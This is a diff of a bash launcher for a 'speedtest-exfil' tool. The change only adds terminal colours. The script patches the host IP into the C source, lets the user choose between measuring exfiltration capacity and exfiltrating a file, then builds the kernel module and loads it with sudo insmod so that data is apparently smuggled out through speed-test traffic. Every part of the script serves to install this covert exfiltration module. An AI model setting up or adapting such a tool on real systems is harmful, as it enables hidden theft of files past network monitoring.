@@ -1,17 +1,24 @@
 #!/bin/bash
 
-echo "=== Speedtest Exfil Setup ==="
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+BOLD='\033[1m'
+NC='\033[0m'
+
+echo -e "${BOLD}${CYAN}=== Speedtest Exfil Setup ===${NC}"
 
 # Detect client IP
 source_ip=$(ip a | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
-echo "Using SOURCE_IP: $source_ip"
+echo -e "${YELLOW}Using SOURCE_IP: $source_ip${NC}"
 
 # Modify constants in C file
 sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" speedtest-exfil.c
 
 # Function selection
 echo ""
-echo "Select function to run:"
+echo -e "${BOLD}Select function to run:${NC}"
 echo "1) max_bytes_exfiled() - calculate max exfiltration capacity"
 echo "2) exfil_file()        - exfiltrate a file"
 read -p "Enter 1 or 2: " choice
@@ -27,26 +34,27 @@ elif [ "$choice" == "2" ]; then
     sed -i "s|        max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
     sed -i "s|	pr_info(\"Total bytes exfiled|//	pr_info(\"Total bytes exfiled|" speedtest-exfil.c
 else
-    echo "Invalid choice. Exiting."
+    echo -e "${RED}Invalid choice. Exiting.${NC}"
     exit 1
 fi
 
 # Build and load
 echo ""
-echo "Building..."
+echo -e "${YELLOW}Building...${NC}"
 make
 
-echo "Loading LKM..."
+echo -e "${YELLOW}Loading LKM...${NC}"
 sudo insmod speedtest-exfil.ko
 
 echo ""
 if [ "$choice" == "1" ]; then
-    echo "Running speedtest..."
+    echo -e "${GREEN}Running speedtest...${NC}"
     speedtest-cli
     sudo rmmod speedtest_exfil && make clean
     echo ""
+    echo -e "${CYAN}Total exfil output:${NC}"
     sudo dmesg | tail -1
 else
-    echo "Done! Run your Speedtest now."
-    echo "When finished, run: sudo rmmod speedtest-exfil.ko && make clean"
+    echo -e "${GREEN}Done! Run your Speedtest now.${NC}"
+    echo -e "When finished, run: ${YELLOW}sudo rmmod speedtest-exfil.ko && make clean${NC}"
 fi
